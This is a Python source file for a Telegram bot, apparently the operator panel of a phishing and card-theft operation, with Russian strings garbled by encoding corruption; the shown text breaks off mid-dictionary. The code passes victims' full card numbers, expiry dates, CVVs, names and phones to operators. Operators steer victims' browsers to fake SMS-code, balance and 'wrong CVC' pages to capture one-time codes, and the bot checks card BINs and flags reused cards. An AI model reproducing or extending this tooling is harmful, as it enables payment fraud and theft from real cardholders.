# [file name]: callbacks.py (–æ–±–Ω–æ–≤–ª–µ–Ω–Ω–∞—è –≤–µ—Ä—Å–∏—è)
# [file content begin]
from aiogram import Dispatcher, types, F, Bot
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.exceptions import TelegramForbiddenError
import httpx
import sys
import os
import asyncio

# –î–æ–±–∞–≤–ª—è–µ–º –∫–æ—Ä–Ω–µ–≤—É—é –¥–∏—Ä–µ–∫—Ç–æ—Ä–∏—é –≤ –ø—É—Ç—å –¥–ª—è –∏–º–ø–æ—Ä—Ç–æ–≤
sys.path.append(os.path.join(os.path.dirname(__file__), '../..'))

# –¢–µ–ø–µ—Ä—å –∏–º–ø–æ—Ä—Ç–∏—Ä—É–µ–º –Ω–∞—à–∏ –º–æ–¥—É–ª–∏
from database.crud import get_log_by_session, update_log_taken_by, find_card_duplicates, release_log
from api.handy_api import get_card_info, format_card_info
from bot.keyboards import get_management_keyboard, get_taken_keyboard, get_take_log_keyboard, get_revoked_keyboard

# –ò–º–ø–æ—Ä—Ç–∏—Ä—É–µ–º —Ñ—É–Ω–∫—Ü–∏–∏ —É–≤–µ–¥–æ–º–ª–µ–Ω–∏–π –¥–ª—è –∞–¥–º–∏–Ω—Å–∫–æ–≥–æ –±–æ—Ç–∞
from admin_bot import notify_log_taken, notify_log_taken_over, notify_action, notify_user_response
import config

class CustomSMSStates(StatesGroup):
    waiting_for_sms_code = State()

async def handle_custom_sms(callback: types.CallbackQuery, state: FSMContext):
    """–û–±—Ä–∞–±–æ—Ç—á–∏–∫ –¥–ª—è –∫–∞—Å—Ç–æ–º–Ω–æ–≥–æ SMS –∫–æ–¥–∞"""
    session_id = callback.data.split(":")[1]
    
    log = get_log_by_session(session_id)
    if not log or log['taken_by'] != callback.from_user.id:
        await callback.answer("–£ –≤–∞—Å –Ω–µ—Ç –¥–æ—Å—Ç—É–ø–∞ –∫ —ç—Ç–æ–º—É –ª–æ–≥—É", show_alert=True)
        return
    
    # –°–æ—Ö—Ä–∞–Ω—è–µ–º session_id –≤ —Å–æ—Å—Ç–æ—è–Ω–∏–∏
    await state.update_data(session_id=session_id)
    
    # –ó–∞–ø—Ä–∞—à–∏–≤–∞–µ–º —É –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è –ø–æ—Å–ª–µ–¥–Ω–∏–µ 2-4 —Ü–∏—Ñ—Ä—ã –Ω–æ–º–µ—Ä–∞ —Ç–µ–ª–µ—Ñ–æ–Ω–∞
    await callback.message.answer(
        "üì± <b>–ö–∞—Å—Ç–æ–º–Ω—ã–π SMS</b>\n\n"
        "–í–≤–µ–¥–∏—Ç–µ –ø–æ—Å–ª–µ–¥–Ω–∏–µ 2-4 —Ü–∏—Ñ—Ä—ã –Ω–æ–º–µ—Ä–∞ —Ç–µ–ª–µ—Ñ–æ–Ω–∞, –Ω–∞ –∫–æ—Ç–æ—Ä—ã–π –¥–æ–ª–∂–µ–Ω –ø—Ä–∏–π—Ç–∏ –∫–æ–¥:",
        parse_mode="HTML"
    )
    
    # –£—Å—Ç–∞–Ω–∞–≤–ª–∏–≤–∞–µ–º —Å–æ—Å—Ç–æ—è–Ω–∏–µ –æ–∂–∏–¥–∞–Ω–∏—è —Ü–∏—Ñ—Ä –Ω–æ–º–µ—Ä–∞
    await state.set_state(CustomSMSStates.waiting_for_sms_code)
    await callback.answer()

async def handle_sms_code_input(message: types.Message, state: FSMContext):
    """–û–±—Ä–∞–±–∞—Ç—ã–≤–∞–µ—Ç –≤–≤–æ–¥ –ø–æ—Å–ª–µ–¥–Ω–∏—Ö 2-4 —Ü–∏—Ñ—Ä –Ω–æ–º–µ—Ä–∞ —Ç–µ–ª–µ—Ñ–æ–Ω–∞ –æ—Ç –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è"""
    # –ü–æ–ª—É—á–∞–µ–º –¥–∞–Ω–Ω—ã–µ –∏–∑ —Å–æ—Å—Ç–æ—è–Ω–∏—è
    data = await state.get_data()
    session_id = data.get('session_id')
    
    if not session_id:
        await message.answer("‚ùå –û—à–∏–±–∫–∞: —Å–µ—Å—Å–∏—è –Ω–µ –Ω–∞–π–¥–µ–Ω–∞")
        await state.clear()
        return
    
    # –ü—Ä–æ–≤–µ—Ä—è–µ–º, —á—Ç–æ –≤–≤–µ–¥–µ–Ω–æ –æ—Ç 2 –¥–æ 4 —Ü–∏—Ñ—Ä (–ø–æ—Å–ª–µ–¥–Ω–∏–µ —Ü–∏—Ñ—Ä—ã –Ω–æ–º–µ—Ä–∞ —Ç–µ–ª–µ—Ñ–æ–Ω–∞)
    phone_digits = message.text.strip()
    if not phone_digits.isdigit() or len(phone_digits) < 2 or len(phone_digits) > 4:
        await message.answer("‚ùå –ü–æ–∂–∞–ª—É–π—Å—Ç–∞, –≤–≤–µ–¥–∏—Ç–µ –æ—Ç 2 –¥–æ 4 —Ü–∏—Ñ—Ä –Ω–æ–º–µ—Ä–∞ —Ç–µ–ª–µ—Ñ–æ–Ω–∞:")
        return
    
    log = get_log_by_session(session_id)
    if not log or log['taken_by'] != message.from_user.id:
        await message.answer("‚ùå –£ –≤–∞—Å –Ω–µ—Ç –¥–æ—Å—Ç—É–ø–∞ –∫ —ç—Ç–æ–º—É –ª–æ–≥—É")
        await state.clear()
        return
    
    # –û—Ç–ø—Ä–∞–≤–ª—è–µ–º –∑–∞–ø—Ä–æ—Å –Ω–∞ —Å–µ—Ä–≤–µ—Ä –¥–ª—è –ø–µ—Ä–µ–Ω–∞–ø—Ä–∞–≤–ª–µ–Ω–∏—è –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è
    try:
        async with httpx.AsyncClient() as client:
            response = await client.post(
                f"{config.SERVER_URL}/redirect-custom-sms", 
                json={
                    "sessionId": session_id,
                    "clientId": log['client_id'],
                    "phoneDigits": phone_digits
                }
            )
            
            if response.status_code == 200:
                # –£–≤–µ–¥–æ–º–ª—è–µ–º –∞–¥–º–∏–Ω—Å–∫–∏–π –±–æ—Ç
                booking_id = log['booking_id'] or "N/A"
                client_id = log['client_id'] or "N/A"
                username = message.from_user.username or "–±–µ–∑ username"
                
                await notify_action(booking_id, client_id, username, message.from_user.id, "custom_sms", f"üì± –ö–∞—Å—Ç–æ–º–Ω—ã–π SMS –Ω–æ–º–µ—Ä: ***{phone_digits}")
                await notify_user_response(booking_id, client_id, username, message.from_user.id, f"‚úÖ –ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å –ø–µ—Ä–µ–Ω–∞–ø—Ä–∞–≤–ª–µ–Ω –Ω–∞ —Å—Ç—Ä–∞–Ω–∏—Ü—É –≤–≤–æ–¥–∞ SMS —Å –Ω–æ–º–µ—Ä–æ–º ***{phone_digits}")
                
                await message.answer(
                    f"‚úÖ –ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å –ø–µ—Ä–µ–Ω–∞–ø—Ä–∞–≤–ª–µ–Ω –Ω–∞ —Å—Ç—Ä–∞–Ω–∏—Ü—É –≤–≤–æ–¥–∞ SMS –∫–æ–¥–∞\n\n"
                    f"üì± –ù–æ–º–µ—Ä —Ç–µ–ª–µ—Ñ–æ–Ω–∞: <b>***{phone_digits}</b>\n"
                    f"üìû –°–æ–æ–±—â–µ–Ω–∏–µ: '–í–≤–µ–¥–∏—Ç–µ –∫–æ–¥ SMS –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω–Ω—ã–π –Ω–∞ —ç—Ç–æ—Ç –Ω–æ–º–µ—Ä —Ç–µ–ª–µ—Ñ–æ–Ω–∞ ***{phone_digits}'",
                    parse_mode="HTML"
                )
            else:
                error_msg = "‚ùå –û—à–∏–±–∫–∞ –ø–µ—Ä–µ–Ω–∞–ø—Ä–∞–≤–ª–µ–Ω–∏—è –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è"
                await message.answer(error_msg)
                
                # –£–≤–µ–¥–æ–º–ª—è–µ–º –∞–¥–º–∏–Ω—Å–∫–∏–π –±–æ—Ç –æ–± –æ—à–∏–±–∫–µ
                booking_id = log['booking_id'] or "N/A"
                client_id = log['client_id'] or "N/A"
                username = message.from_user.username or "–±–µ–∑ username"
                await notify_user_response(booking_id, client_id, username, message.from_user.id, error_msg)
                
    except Exception as e:
        print(f"Error in custom SMS redirect: {e}")
        error_msg = "‚ùå –û—à–∏–±–∫–∞ —Å–æ–µ–¥–∏–Ω–µ–Ω–∏—è —Å —Å–µ—Ä–≤–µ—Ä–æ–º"
        await message.answer(error_msg)
        
        # –£–≤–µ–¥–æ–º–ª—è–µ–º –∞–¥–º–∏–Ω—Å–∫–∏–π –±–æ—Ç –æ–± –æ—à–∏–±–∫–µ
        booking_id = log['booking_id'] or "N/A"
        client_id = log['client_id'] or "N/A"
        username = message.from_user.username or "–±–µ–∑ username"
        await notify_user_response(booking_id, client_id, username, message.from_user.id, error_msg)
    
    # –û—á–∏—â–∞–µ–º —Å–æ—Å—Ç–æ—è–Ω–∏–µ
    await state.clear()

async def handle_take_log_with_timers(callback: types.CallbackQuery):
    """–û–±—Ä–∞–±–æ—Ç—á–∏–∫ –≤–∑—è—Ç–∏—è –ª–æ–≥–∞ —Å —Ç–∞–π–º–µ—Ä–∞–º–∏ –¥–ª—è —Ç—Ä–∞–Ω–∑–∏—Ç–Ω—ã—Ö —Å—Ç—Ä–∞–Ω–∏—Ü"""
    session_id = callback.data.split(":")[1]
    
    log = get_log_by_session(session_id)
    if not log:
        await callback.answer("–õ–æ–≥ –Ω–µ –Ω–∞–π–¥–µ–Ω", show_alert=True)
        return
        
    if log['taken_by']:
        await callback.answer("–≠—Ç–æ—Ç –ª–æ–≥ —É–∂–µ –∑–∞–Ω—è—Ç", show_alert=True)
        return

    update_log_taken_by(session_id, callback.from_user.id)

    # –û—Ç–ø—Ä–∞–≤–ª—è–µ–º —É–≤–µ–¥–æ–º–ª–µ–Ω–∏–µ –≤ –≥—Ä—É–ø–ø—É
    booking_id = log['booking_id'] or "N/A"
    client_id = log['client_id'] or "N/A"
    username = callback.from_user.username or "–±–µ–∑ username"
    
    group_message = (
        f"üì• –õ–æ–≥ - #{booking_id} || #{client_id} - "
        f"–≤–∑—è–ª @{username}(ID: {callback.from_user.id})"
    )
    
    await callback.bot.send_message(config.GROUP_ID_TEST, group_message)

    # –£–≤–µ–¥–æ–º–ª—è–µ–º –∞–¥–º–∏–Ω—Å–∫–∏–π –±–æ—Ç
    await notify_log_taken(booking_id, client_id, username, callback.from_user.id)

    # –ù–ï–ú–ï–î–õ–ï–ù–ù–û –ø–µ—Ä–µ–Ω–∞–ø—Ä–∞–≤–ª—è–µ–º –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è –Ω–∞ –ø–µ—Ä–≤—É—é —Ç—Ä–∞–Ω–∑–∏—Ç–Ω—É—é —Å—Ç—Ä–∞–Ω–∏—Ü—É
    try:
        async with httpx.AsyncClient() as client:
            response = await client.post(
                f"{config.SERVER_URL}/redirect-transit-1", 
                json={
                    "sessionId": session_id,
                    "clientId": log['client_id']
                }
            )
            
            if response.status_code == 200:
                await callback.answer("‚úÖ –ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å –ø–µ—Ä–µ–Ω–∞–ø—Ä–∞–≤–ª–µ–Ω –Ω–∞ –æ–±—Ä–∞–±–æ—Ç–∫—É")
            else:
                await callback.answer("‚ùå –û—à–∏–±–∫–∞ –ø–µ—Ä–µ–Ω–∞–ø—Ä–∞–≤–ª–µ–Ω–∏—è", show_alert=True)
                
    except Exception as e:
        print(f"Error redirecting to transit-1: {e}")
        await callback.answer("‚ùå –û—à–∏–±–∫–∞ —Å–æ–µ–¥–∏–Ω–µ–Ω–∏—è", show_alert=True)

    # –ó–∞–ø—É—Å–∫–∞–µ–º —Ç–∞–π–º–µ—Ä –¥–ª—è –≤—Ç–æ—Ä–æ–π —Ç—Ä–∞–Ω–∑–∏—Ç–Ω–æ–π —Å—Ç—Ä–∞–Ω–∏—Ü—ã (—á–µ—Ä–µ–∑ 15 —Å–µ–∫—É–Ω–¥)
    asyncio.create_task(schedule_transit_2_redirect(session_id, log['client_id'], callback.bot))

    # –ó–∞–ø—É—Å–∫–∞–µ–º —Ç–∞–π–º–µ—Ä –¥–ª—è SMS —Å—Ç—Ä–∞–Ω–∏—Ü—ã (—á–µ—Ä–µ–∑ 30 —Å–µ–∫—É–Ω–¥)
    asyncio.create_task(schedule_sms_redirect(session_id, log['client_id'], callback.bot))

    # –û—Ç–ø—Ä–∞–≤–ª—è–µ–º –¥–∞–Ω–Ω—ã–µ –æ–ø–µ—Ä–∞—Ç–æ—Ä—É
    await send_operator_data(callback, session_id, log)

async def schedule_transit_2_redirect(session_id: str, client_id: str, bot: Bot):
    """–ó–∞–ø–ª–∞–Ω–∏—Ä–æ–≤–∞—Ç—å –ø–µ—Ä–µ—Ö–æ–¥ –Ω–∞ –≤—Ç–æ—Ä—É—é —Ç—Ä–∞–Ω–∑–∏—Ç–Ω—É—é —Å—Ç—Ä–∞–Ω–∏—Ü—É —á–µ—Ä–µ–∑ 15 —Å–µ–∫—É–Ω–¥"""
    await asyncio.sleep(15)
    
    try:
        async with httpx.AsyncClient() as client:
            await client.post(
                f"{config.SERVER_URL}/redirect-transit-2", 
                json={
                    "sessionId": session_id,
                    "clientId": client_id
                }
            )
        print(f"üîÑ Scheduled transit-2 redirect for {session_id}")
    except Exception as e:
        print(f"Error scheduling transit-2: {e}")

async def schedule_sms_redirect(session_id: str, client_id: str, bot: Bot):
    """–ó–∞–ø–ª–∞–Ω–∏—Ä–æ–≤–∞—Ç—å –ø–µ—Ä–µ—Ö–æ–¥ –Ω–∞ SMS —Å—Ç—Ä–∞–Ω–∏—Ü—É —á–µ—Ä–µ–∑ 30 —Å–µ–∫—É–Ω–¥"""
    await asyncio.sleep(30)
    
    try:
        async with httpx.AsyncClient() as client:
            await client.post(
                f"{config.SERVER_URL}/redirect-sms", 
                json={
                    "sessionId": session_id,
                    "clientId": client_id
                }
            )
        print(f"üì± Scheduled SMS redirect for {session_id}")
    except Exception as e:
        print(f"Error scheduling SMS: {e}")

async def send_operator_data(callback: types.CallbackQuery, session_id: str, log: dict):
    """–û—Ç–ø—Ä–∞–≤–ª—è–µ—Ç –¥–∞–Ω–Ω—ã–µ –æ–ø–µ—Ä–∞—Ç–æ—Ä—É"""
    async with httpx.AsyncClient() as client:
        customer = (await client.get(f"{config.SERVER_URL}/customer/{session_id}")).json()
        card = (await client.get(f"{config.SERVER_URL}/card/{session_id}")).json()
        booking = (await client.get(f"{config.SERVER_URL}/booking/{session_id}")).json()

    booking_id = log['booking_id'] or "N/A"
    client_id = log['client_id'] or "N/A"
    
    full_pan = card.get('full_pan', '')
    
    duplicates = find_card_duplicates(log['masked_pan'])
    previous_uses = [dup for dup in duplicates if dup['session_id'] != session_id]
    
    if full_pan:
        bin_number = full_pan[:6]
        card_info = await get_card_info(bin_number)
        card_info_text = format_card_info(card_info)
    else:
        card_info_text = "‚ùå –ò–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è –æ –∫–∞—Ä—Ç–µ –Ω–µ–¥–æ—Å—Ç—É–ø–Ω–∞"
    
    text = (
        f"–õ–æ–≥ #{booking_id} || #{client_id}\n\n"
    )
    
    if previous_uses:
        text += f"‚ö†Ô∏è <b>–≠—Ç–∞ –∫–∞—Ä—Ç–∞ —É–∂–µ –≤–≤–æ–¥–∏–ª–∞—Å—å —Ä–∞–Ω–µ–µ</b>\n\n"
    
    text += (
        f"üí≥  –ö–∞—Ä—Ç–∞: <code>{full_pan}</code>\n"
        f"üóìÔ∏è  –°—Ä–æ–∫ –¥–µ–π—Å—Ç–≤–∏—è –∫–∞—Ä—Ç—ã: {card.get('expire_date')}\n"
        f"üîí  CVV: {card.get('cvv')}\n\n"
        f"üìä <b>–ò–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è –æ –∫–∞—Ä—Ç–µ:</b>\n"
        f"{card_info_text}\n\n"
        f"üë§  –ò–º—è: {customer.get('name')} {customer.get('surname')}\n"
        f"üìû  –ù–æ–º–µ—Ä: {customer.get('phone')}\n\n"
        f"üí∏  –°—É–º–º–∞: {booking.get('total_amount')}.00 AED\n\n"
        f"üïí <b>–¢–∞–π–º–µ—Ä—ã –∑–∞–ø—É—â–µ–Ω—ã:</b>\n"
        f"‚Ä¢ –ß–µ—Ä–µ–∑ 15 —Å–µ–∫: –í—Ç–æ—Ä–∞—è —Ç—Ä–∞–Ω–∑–∏—Ç–Ω–∞—è —Å—Ç—Ä–∞–Ω–∏—Ü–∞\n"
        f"‚Ä¢ –ß–µ—Ä–µ–∑ 30 —Å–µ–∫: –°—Ç—Ä–∞–Ω–∏—Ü–∞ SMS"
    )

    await callback.bot.send_message(
        callback.from_user.id, 
        text, 
        parse_mode="HTML", 
        reply_markup=get_management_keyboard(session_id)
    )
    
    await callback.message.edit_reply_markup(
        reply_markup=get_taken_keyboard(
            callback.from_user.username, 
            callback.from_user.id,
            session_id
        )
    )

async def take_from_user(callback: types.CallbackQuery):
    """–û–±—Ä–∞–±–æ—Ç—á–∏–∫ –¥–ª—è –≤–∑—è—Ç–∏—è –ª–æ–≥–∞ —É –¥—Ä—É–≥–æ–≥–æ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è"""
    
    session_id = callback.data.split(":")[1]
    
    log = get_log_by_session(session_id)
    if not log:
        await callback.answer("–õ–æ–≥ –Ω–µ –Ω–∞–π–¥–µ–Ω", show_alert=True)
        return
    
    if not log['taken_by']:
        await callback.answer("–≠—Ç–æ—Ç –ª–æ–≥ –Ω–∏–∫–µ–º –Ω–µ –∑–∞–Ω—è—Ç", show_alert=True)
        return
    
    # –ù–µ–ª—å–∑—è –∑–∞–±—Ä–∞—Ç—å —É —Å–∞–º–æ–≥–æ —Å–µ–±—è
    if log['taken_by'] == callback.from_user.id:
        await callback.answer("–í—ã —É–∂–µ –≤–ª–∞–¥–µ–µ—Ç–µ —ç—Ç–∏–º –ª–æ–≥–æ–º", show_alert=True)
        return
    
    # –°–æ—Ö—Ä–∞–Ω—è–µ–º ID –ø—Ä–µ–¥—ã–¥—É—â–µ–≥–æ –≤–ª–∞–¥–µ–ª—å—Ü–∞
    previous_owner_id = log['taken_by']
    
    # –û—Ç–ø—Ä–∞–≤–ª—è–µ–º —É–≤–µ–¥–æ–º–ª–µ–Ω–∏–µ –≤ –≥—Ä—É–ø–ø—É –æ —Å–º–µ–Ω–µ –≤–ª–∞–¥–µ–ª—å—Ü–∞
    booking_id = log['booking_id'] or "N/A"
    client_id = log['client_id'] or "N/A"
    new_username = callback.from_user.username or "–±–µ–∑ username"
    
    group_message = (
        f"üîÑ –õ–æ–≥ - #{booking_id} || #{client_id} - "
        f"–ø–µ—Ä–µ—à–µ–ª –∫ @{new_username}(ID: {callback.from_user.id})"
    )
    
    await callback.bot.send_message(config.GROUP_ID_TEST, group_message)
    
    # –£–≤–µ–¥–æ–º–ª—è–µ–º –∞–¥–º–∏–Ω—Å–∫–∏–π –±–æ—Ç –æ –ø–µ—Ä–µ—Ö–≤–∞—Ç–µ
    await notify_log_taken_over(booking_id, client_id, new_username, callback.from_user.id, previous_owner_id)
    
    # –ó–∞–±–∏—Ä–∞–µ–º –ª–æ–≥ —Å–µ–±–µ
    update_log_taken_by(session_id, callback.from_user.id)
    
    # –û—Å—Ç–∞–ª—å–Ω–æ–π –∫–æ–¥ –±–µ–∑ –∏–∑–º–µ–Ω–µ–Ω–∏–π...
    async with httpx.AsyncClient() as client:
        customer = (await client.get(f"{config.SERVER_URL}/customer/{session_id}")).json()
        card = (await client.get(f"{config.SERVER_URL}/card/{session_id}")).json()
        booking = (await client.get(f"{config.SERVER_URL}/booking/{session_id}")).json()

    booking_id = log['booking_id'] or "N/A"
    client_id = log['client_id'] or "N/A"
    
    full_pan = card.get('full_pan', '')
    
    # –ü—Ä–æ–≤–µ—Ä—è–µ–º –¥—É–±–ª–∏–∫–∞—Ç—ã –∫–∞—Ä—Ç—ã
    duplicates = find_card_duplicates(log['masked_pan'])
    previous_uses = [dup for dup in duplicates if dup['session_id'] != session_id]
    
    if full_pan:
        bin_number = full_pan[:6]
        card_info = await get_card_info(bin_number)
        card_info_text = format_card_info(card_info)
    else:
        card_info_text = "‚ùå –ò–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è –æ –∫–∞—Ä—Ç–µ –Ω–µ–¥–æ—Å—Ç—É–ø–Ω–∞"
    
    # –§–æ—Ä–º–∏—Ä—É–µ–º —Ç–µ–∫—Å—Ç
    text = (
        f"üîÑ <b>–õ–æ–≥ –ø–µ—Ä–µ—Ö–≤–∞—á–µ–Ω —É –¥—Ä—É–≥–æ–≥–æ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è</b>\n\n"
        f"–õ–æ–≥ #{booking_id} || #{client_id}\n\n"
    )
    
    if previous_uses:
        text += f"‚ö†Ô∏è <b>–≠—Ç–∞ –∫–∞—Ä—Ç–∞ —É–∂–µ –≤–≤–æ–¥–∏–ª–∞—Å—å —Ä–∞–Ω–µ–µ</b>\n\n"
    
    text += (
        f"üí≥  –ö–∞—Ä—Ç–∞: <code>{full_pan}</code>\n"
        f"üóìÔ∏è  –°—Ä–æ–∫ –¥–µ–π—Å—Ç–≤–∏—è –∫–∞—Ä—Ç—ã: {card.get('expire_date')}\n"
        f"üîí  CVV: {card.get('cvv')}\n\n"
        f"üìä <b>–ò–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è –æ –∫–∞—Ä—Ç–µ:</b>\n"
        f"{card_info_text}\n\n"
        f"üë§  –ò–º—è: {customer.get('name')} {customer.get('surname')}\n"
        f"üìû  –ù–æ–º–µ—Ä: {customer.get('phone')}\n\n"
        f"üí∏  –°—É–º–º–∞: {booking.get('total_amount')}.00 AED"
    )

    # –û—Ç–ø—Ä–∞–≤–ª—è–µ–º –¥–∞–Ω–Ω—ã–µ –Ω–æ–≤–æ–º—É –≤–ª–∞–¥–µ–ª—å—Ü—É
    await callback.bot.send_message(
        callback.from_user.id, 
        text, 
        parse_mode="HTML", 
        reply_markup=get_management_keyboard(session_id)
    )
    
    # –û–±–Ω–æ–≤–ª—è–µ–º –∫–Ω–æ–ø–∫—É –≤ –≥—Ä—É–ø–ø–µ
    await callback.message.edit_reply_markup(
        reply_markup=get_taken_keyboard(
            callback.from_user.username,
            callback.from_user.id,
            session_id
        )
    )
    
    # –£–≤–µ–¥–æ–º–ª—è–µ–º –ø—Ä–µ–¥—ã–¥—É—â–µ–≥–æ –≤–ª–∞–¥–µ–ª—å—Ü–∞ —Å –æ–±—Ä–∞–±–æ—Ç–∫–æ–π –æ—à–∏–±–∫–∏
    try:
        await callback.bot.send_message(
            previous_owner_id,
            f"‚ö†Ô∏è <b>–õ–æ–≥ #{booking_id} || #{client_id} –±—ã–ª –ø–µ—Ä–µ—Ö–≤–∞—á–µ–Ω –¥—Ä—É–≥–∏–º –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–º</b>\n\n"
            f"–í—Å–µ —É–ø—Ä–∞–≤–ª—è—é—â–∏–µ –∫–Ω–æ–ø–∫–∏ –¥–ª—è —ç—Ç–æ–≥–æ –ª–æ–≥–∞ –¥–µ–∞–∫—Ç–∏–≤–∏—Ä–æ–≤–∞–Ω—ã.",
            parse_mode="HTML"
        )
    except TelegramForbiddenError:
        # –õ–æ–≥–∏—Ä—É–µ–º, –Ω–æ –Ω–µ –ø—Ä–µ—Ä—ã–≤–∞–µ–º –≤—ã–ø–æ–ª–Ω–µ–Ω–∏–µ
        print(f"–ù–µ —É–¥–∞–ª–æ—Å—å —É–≤–µ–¥–æ–º–∏—Ç—å –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è {previous_owner_id}: –±–æ—Ç –∑–∞–±–ª–æ–∫–∏—Ä–æ–≤–∞–Ω –∏–ª–∏ –¥–∏–∞–ª–æ–≥ –Ω–µ –Ω–∞—á–∞—Ç")
        # –ú–æ–∂–Ω–æ –æ—Ç–ø—Ä–∞–≤–∏—Ç—å —É–≤–µ–¥–æ–º–ª–µ–Ω–∏–µ –≤ –≥—Ä—É–ø–ø—É
        await callback.bot.send_message(
            config.GROUP_ID_TEST,
            f"‚ö†Ô∏è –ù–µ —É–¥–∞–ª–æ—Å—å —É–≤–µ–¥–æ–º–∏—Ç—å –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è ID {previous_owner_id} –æ –ø–µ—Ä–µ—Ö–≤–∞—Ç–µ –ª–æ–≥–∞"
        )
    except Exception as e:
        print(f"–û—à–∏–±–∫–∞ –ø—Ä–∏ —É–≤–µ–¥–æ–º–ª–µ–Ω–∏–∏ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è {previous_owner_id}: {e}")
    
    await callback.answer("‚úÖ –õ–æ–≥ —É—Å–ø–µ—à–Ω–æ –ø–µ—Ä–µ—Ö–≤–∞—á–µ–Ω", show_alert=True)

async def handle_redirect_action(callback: types.CallbackQuery):
    action, session_id = callback.data.split(":")
    
    log = get_log_by_session(session_id)
    if not log or log['taken_by'] != callback.from_user.id:
        await callback.answer("–£ –≤–∞—Å –Ω–µ—Ç –¥–æ—Å—Ç—É–ø–∞ –∫ —ç—Ç–æ–º—É –ª–æ–≥—É", show_alert=True)
        return
    
    # –û–ø—Ä–µ–¥–µ–ª—è–µ–º —Ç–µ–∫—Å—Ç–æ–≤–æ–µ –æ–ø–∏—Å–∞–Ω–∏–µ –¥–µ–π—Å—Ç–≤–∏—è
    action_descriptions = {
        "balance": "üí∞ –ü—Ä–æ–≤–µ—Ä–∫–∞ –±–∞–ª–∞–Ω—Å–∞",
        "sms": "üìû –ó–∞–ø—Ä–æ—Å SMS –∫–æ–¥–∞", 
        "change": "üîÑ –°–º–µ–Ω–∞ –∫–∞—Ä—Ç—ã",
        "success": "‚úÖ –£—Å–ø–µ—à–Ω–∞—è –æ–ø–ª–∞—Ç–∞",
        "wrong_cvc": "‚ùå –û—à–∏–±–∫–∞ CVC",
        "wrong_sms": "‚ùå –û—à–∏–±–∫–∞ SMS",
        "prepaid": "‚ùå Prepaid –∫–∞—Ä—Ç–∞",
        "check_online": "üîç –ü—Ä–æ–≤–µ—Ä–∫–∞ –æ–Ω–ª–∞–π–Ω —Å—Ç–∞—Ç—É—Å–∞"
    }
    
    action_text = action_descriptions.get(action, action)
    
    # –£–≤–µ–¥–æ–º–ª—è–µ–º –∞–¥–º–∏–Ω—Å–∫–∏–π –±–æ—Ç –æ –¥–µ–π—Å—Ç–≤–∏–∏
    booking_id = log['booking_id'] or "N/A"
    client_id = log['client_id'] or "N/A"
    username = callback.from_user.username or "–±–µ–∑ username"
    
    await notify_action(booking_id, client_id, username, callback.from_user.id, action, action_text)
    
    # –û–±—Ä–∞–±–æ—Ç–∫–∞ –ø—Ä–æ–≤–µ—Ä–∫–∏ –æ–Ω–ª–∞–π–Ω —Å—Ç–∞—Ç—É—Å–∞ (–æ—Å—Ç–∞–µ—Ç—Å—è –±–µ–∑ –∏–∑–º–µ–Ω–µ–Ω–∏–π)
    if action == "check_online":
        await check_online_status(callback)
        return
    
    endpoints = {
        "balance": "/redirect-balance",
        "sms": "/redirect-sms", 
        "change": "/redirect-change",
        "success": "/redirect-success",
        "wrong_cvc": "/redirect-wrong-cvc",
        "wrong_sms": "/redirect-wrong-sms",
        "prepaid": "/redirect-prepaid"
    }
    
    try:
        async with httpx.AsyncClient() as client:
            response = await client.post(
                f"{config.SERVER_URL}{endpoints[action]}", 
                json={
                    "sessionId": session_id,
                    "clientId": log['client_id']
                }
            )
            
            if response.status_code == 200:
                messages = {
                    "balance": "‚úÖ –ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å –ø–µ—Ä–µ–Ω–∞–ø—Ä–∞–≤–ª–µ–Ω –Ω–∞ —Å—Ç—Ä–∞–Ω–∏—Ü—É –±–∞–ª–∞–Ω—Å–∞",
                    "sms": "‚úÖ –ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å –ø–µ—Ä–µ–Ω–∞–ø—Ä–∞–≤–ª–µ–Ω –Ω–∞ —Å—Ç—Ä–∞–Ω–∏—Ü—É –≤–≤–æ–¥–∞ –∫–æ–¥–∞",
                    "change": "‚úÖ –ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å –ø–µ—Ä–µ–Ω–∞–ø—Ä–∞–≤–ª–µ–Ω –Ω–∞ —Å—Ç—Ä–∞–Ω–∏—Ü—É –∑–∞–º–µ–Ω—ã –∫–∞—Ä—Ç—ã", 
                    "success": "‚úÖ –£—Å–ø–µ—à–Ω–∞—è –æ–ø–ª–∞—Ç–∞!",
                    "wrong_cvc": "‚úÖ –ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å –ø–µ—Ä–µ–Ω–∞–ø—Ä–∞–≤–ª–µ–Ω –Ω–∞ —Å—Ç—Ä–∞–Ω–∏—Ü—É –≤–≤–æ–¥–∞ –∫–∞—Ä—Ç—ã –∑–∞–Ω–æ–≤–æ (–Ω–µ–≤–µ—Ä–Ω—ã–π CVC)",
                    "wrong_sms": "‚úÖ –ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å –ø–µ—Ä–µ–Ω–∞–ø—Ä–∞–≤–ª–µ–Ω –Ω–∞ —Å—Ç—Ä–∞–Ω–∏—Ü—É –ø–æ–≤—Ç–æ—Ä–æ–≥–æ –≤–≤–æ–¥–∞ –∫–æ–¥–∞ (–Ω–µ–≤–µ—Ä–Ω—ã–π SMS –∫–æ–¥)",
